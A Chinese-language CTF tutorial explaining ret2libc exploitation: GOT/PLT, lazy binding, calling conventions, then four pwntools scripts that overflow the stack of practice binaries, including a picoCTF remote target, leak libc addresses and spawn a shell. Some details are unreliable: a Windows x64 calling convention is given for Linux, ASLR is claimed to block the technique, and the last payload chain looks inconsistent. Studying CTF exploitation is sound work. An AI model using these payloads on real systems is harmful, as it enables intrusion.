#### 前提知识：

##### 1. GOT表和PLT表:

GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。

---

##### 2. linux延时绑定机制:

所谓延时绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序。

如下是一个示例流程图：
![[Pasted image 20240923213455.png]]
![[Pasted image 20241124215229.png]]
具体我们看个实例：

这里vulnerable_function函数调用了read函数，由于read函数是动态链接加载进来的只有在链接的时候才知道地址，编译时并不知道地址
![[Pasted image 20240923213518.png]]
got表中的所存的read函数的地址便是在pwn6进程中的实际地址，也就是

![[Pasted image 20240923213532.png]]

---

##### 3. x32与x64的不同传参方式：

1. 在x86下我们汇编的传参如下:

```

push eax
call xxx

xxx fun proc

push        ebp          保存栈底
mov         ebp,esp      设置ebp
sub         esp,0C0h     开辟局部变量空间
push        ebx          保存寄存器环境
push        esi  
push        edi  

pop         edi          恢复寄存器环境
pop         esi  
pop         ebx          
mov         esp,ebp      释放局部变量空间
pop         ebp          恢复栈底
ret                      返回,平展, 如果是 C在外平展 add esp,xxx stdcall 则内部平展 ret 4
```

我们可以根据上图可以看到.在调用函数的时候做了那些事情.

（1）往栈中存放参数  
（2）将返回地址入栈  
（3）保存栈底

（4）栈内部进行自己的 申请空间 保存环境 以及释放.

在x64下,万变不离其宗.大部分跟x86一样.

如汇编代码为:

```
sub rsp,0x28

mov r9,1
mov r8,2
mov rdx,3
mov rcx,4
call xxx
add rsp,0x28
```

1.传参方式  
首先说明一下,在X64下,是寄存器传参. 前4个参数分别是 **rcx rdx r8 r9**进行传参.**多余的通过栈传参.从右向左入栈**.  
2.申请参数预留空间  
在x64下,在调用一个函数的时候,会申请一个参数预留空间.用来保存我们的参数.比如以前我们通过push压栈  
参数的值.相应的栈就会抬高.其实x64下,一样会申请.只不过这个地方在进函数的时候并没有值.进入函数之后才会将寄存器的值在拷贝到这个栈中.其实就相当于你还是push了.只不过我是外边申请空间,内部进行赋值.

---

##### 4. 什么是libc函数？

libc是Standard C library的简称，它是符合ANSI C标准的一个函数库。libc库提供C语言中所使用的宏，类型定义，字符串操作函数，数学计算函数以及输入输出函数等。正如ANSI C是C语言的标准一样，libc只是一种函数库标准，每个操作系统都会按照该标准对标准库进行具体实现

---

##### 5. ret2libc原理：

ret2libc，即控制执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。

具体过程为：在内存中确定某个函数的地址，并用其覆盖掉返回地址，让其指向前面确定的函数。由于 libc 动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如 system() 等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。

---

#### 如何使用libc

1、绕过NX ret2libc aslr随机化 泄露libc地址

2、aslr导致ret2libc的技术常常需要配合一个泄露的操作

3、ret2libc = leak libc 地址 + sys（/bin/sh）

简单的说：

1、泄露任意一个函数的真实地址：只有被执行过的函数才能获取地址

2、获取libc的版本

3、根据偏移获取shell和sh的位置：a、求libc的基地址（函数动态地址-函数偏移量）b、求其他函数地址（基地址+函数偏移量）

4、执行程序获取shell

##### 第一个问题——system()地址如何确定？

要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。

##### 第二个问题——“/bin/sh”字符串地址如何确定？

可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。

**前提条件**

由前面分析可知，ret2libc这项技术的前提是需要操作系统关闭内存布局随机化（ASLR）。

---

#### ret2libc通常可以分为下面这几类：

- 程序中自身就含有system函数和”/bin/sh”字符串
- 程序中自身就有system函数，但是没有”/bin/sh”字符串
- 程序中自身就没有system函数和”/bin/sh”字符串，但给出了libc.so文件
- 程序中自身就没有system函数和”/bin/sh”字符串，并且没有给出libc.so文件

---

#### 基本思路

针对于上面的几类ret2libc ，不管程序有没有直接给出我们需要条件，我们都要想办法得到system函数和字符串/bin/sh的地址

当程序中没有字符串/bin/sh时我们可以利用程序中某些函数如:read,fgets,gets等函数将/bin/sh字符串写入bss段

对于只给出了libc.so文件的程序，我们可以直接在libc.so文件当中去找system()函数和/bin/sh字符串

最后对于没有给出libc.so文件的程序，我们可以通过泄露出程序当中的某个函数的地址，通过ldd查询来找出其使用libc.so版本是哪一个,然后再去找system()函数和/bin/sh字符串

##### 第一类：存在system()函数,bin/sh

运行程序，提示应用ret2libc，且用file查看是动态链接文件，和libc有关：
![[Pasted image 20240923213549.png]]
  
可知“/bin/sh”字符串所在地址为0x08048720。

因为要从libc中寻找利用函数，则可以在ida直接查看plt中是否有system()函数，发现是存在有的且地址为0x08048460：
![[Pasted image 20240923213606.png]]
exp:

```
from pwn import *

sh = process("./ret2libc1")
binsh_addr = 0x08048720
libc_system_addr = 0x08048460
payload = flat(["A" * 0x70, libc_system_addr, "6666", binsh_addr])
sh.sendline(payload)
sh.interactive()
```

##### 第二类：ret2libc2——只有system()

运行程序，file查看文件为动态链接即和libc相关，查看保护机制只开启NX：
![[Pasted image 20240923213622.png]]
可以发现与示例1相比，这次不直接提供“/bin/sh”，那就换种思维，多利用一个gadgets，可以在plt中看到有gets()函数，即可以将该gets()函数地址用来踩掉原本程序函数的返回地址，然后通过输入的方式将“/bin/sh”输入进去。换句话说，整个过程分成了两部分，第一部分是将“/bin/sh”读入到内存中；第二部分是执行system()获取shell：
![[Pasted image 20240923213701.png]]
最后就是payload的构造了。因为在gets()函数完成后需要调用system()函数需要保持堆栈平衡，所以在调用完gets()函数后提升堆栈，这就需要add esp, 4这样的指令但是程序中并没有这样的指令。更换思路，通过使用pop xxx指令也可以完成同样的功能，在程序中找到了pop ebx，ret指令。通过ROPgadget工具查看，发现存在一条符合条件的指令，地址为0x0804841d：
![[Pasted image 20240923213720.png]]
编写payload：

```
from pwn import *

sh = process("./ret2libc2")
libc_gets_addr = 0x08048460
libc_system_addr = 0x08048490
buf2_addr = 0x0804a080
pop_ebx_addr = 0x0804841d
payload = flat(["A" * 0x70, libc_gets_addr, pop_ebx_addr, buf2_addr, libc_system_addr, '6666', buf2_addr])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

##### 第三类：ret2libc3——无system()和/bin/sh，无 libc.so文件

首先，查看安全保护：
![[Pasted image 20240923213731.png]]
  
那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点：

- system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
- 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。

为什么是最低的12为不会改变呢，那是因为虚拟内存的储存是以页的形式存储的，而页的最小单位是4kb，也就是2的12次方，因此是12位。

那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。

此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。

这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下

- 泄露 __libc_start_main 地址
- 获取 libc 版本
- 获取 system 地址与 /bin/sh 的地址
- 再次执行源程序
- 触发栈溢出执行 system(‘/bin/sh’)

exp 如下：

```
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print("leak libc_start_main_got addr and return to main again")
payload = flat([b'A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter(b'Can you find it !?', payload)

print("get the related addr")
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print("get shell")
payload = flat([b'A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

##### 第四类：ret2libc3——无system()和/bin/sh，有 libc.so文件

对于还含有libc.so文件的,我们可以通过.so文件去寻找system和bin/sh，

结合libc的延迟绑定机制，下面要做的是需要我们泄露某个已经执行过的函数的真实地址，实现泄露地址功能的函数可以通过puts()函数来输出打印出来实现，而参数填的是某个已经执行过的函数的GOT地址；同时为了程序再次执行能重新实现栈溢出功能，在puts()函数的返回地址填的是_start()函数或main()函数地址即可。

对于system()函数，其属于libc，在libc.so动态链接库中的函数之间相对偏移是固定的。我们由泄露的某个函数的GOT表地址可以计算出偏移地址（A真实地址-A的偏移地址 = B真实地址-B的偏移地址 = 基地址），从而可以得到system()函数的真实地址（当然也可以直接调用pwntools的libc.address得到libc的真实地址，然后再直接查找即可找到真实的system()函数地址）。

_start()和main()的区别

简单地说，main()函数是用户代码的入口，是对用户而言的；而_start()函数是系统代码的入口，是程序真正的入口。

checksec查看一下，开启了NX，且是64位，
![[Pasted image 20240923213747.png]]
题目也给了libc.so文件，因此可以先构造第一次的payload，可以通过put函数泄露main的got的真实地址

然后可以通过引用的libcsearcher库，分析出libc的版本，然后通过泄露的真实地址与libc中的main的地址相减可以得出基地址，最后在libc文件中找到system函数的地址与bin/sh的地址各自加上基地址，就得到了在可执行文件中system与bin/sh,然后构造第二个payload,在这里要记得进行栈对齐，否则运行失败

```
from pwn import *
p = remote('mercury.picoctf.net', 37289)
#p=process('./vuln')
elf = ELF("./vuln")
libc = ELF("./libc.so")
rop = ROP(elf)

PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']

POP_RDI = 0x0000000000400913
RET = 0x000000000040052e


#create the first rop chain to leak libc address
JUNK = (b"A"*136)
rop = JUNK
rop += p64(POP_RDI)
rop += p64(LIBC_START_MAIN)
rop += p64(PUTS)
rop += p64(MAIN)

#p.sendlineafter("sErVeR!", rop)
p.sendline(rop)
p.recvline()
p.recvline()

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))


libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

#second rop chain to jump to /bin/sh
rop2 = JUNK
rop2 += p64(RET)
rop2 += p64(POP_RDI)
rop2 += p64(libc.address + 0x10a45c)


rop2 += p64(leak)

p.sendlineafter("sErVeR!", rop2)

p.interactive()
```